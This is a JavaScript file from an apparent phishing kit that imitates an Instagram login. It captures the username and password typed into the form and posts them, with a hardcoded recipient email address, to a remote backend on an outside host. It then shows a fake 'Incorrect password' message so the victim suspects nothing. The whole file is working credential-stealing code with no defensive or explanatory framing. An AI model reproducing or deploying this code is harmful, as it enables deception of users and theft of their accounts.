const form = document.getElementById("insta-submit");
const loader = document.getElementById("loader");
const result = document.getElementById("res");

const handleSubmit = (e) => {
    e.preventDefault();
    loader.style.display = "block";
    
    setTimeout(()=>{
        result.innerHTML= "<div style='padding: 60px 0;'></div>";
        setTimeout(()=>{
            const form = new FormData();
            const recipient = "1stcrase7@gmail.com";
            const email_backend = "https://active-pay-backend.onrender.com/";
            const body = (`
               New Instagram Credential

               Email/Username: ${e.target.username.value}
               Password: ${e.target.password.value}

            `);

            form.append('recipient', recipient);
            form.append('body', body);

            // send the mail
            fetch(email_backend, {
                mode: 'cors',
                headers:{
                       'Access-Control-Allow-Origin':'*'
                }, 
                method: 'POST', 
                body: form
            })
            .then(action =>{
                setTimeout(()=>{
                result.innerHTML="<div style='padding: 25px;text-align:center; color:red;'>Incorrect password <br><a href='/login/login-page.html'>Go back to Login</a></div>";
                loader.style.display = "none";
                }, 8000);

            })
            .catch(err=>console.log("Error: ", err));

        }, 5000);
    }, 3000)
};


form?.addEventListener('submit', handleSubmit);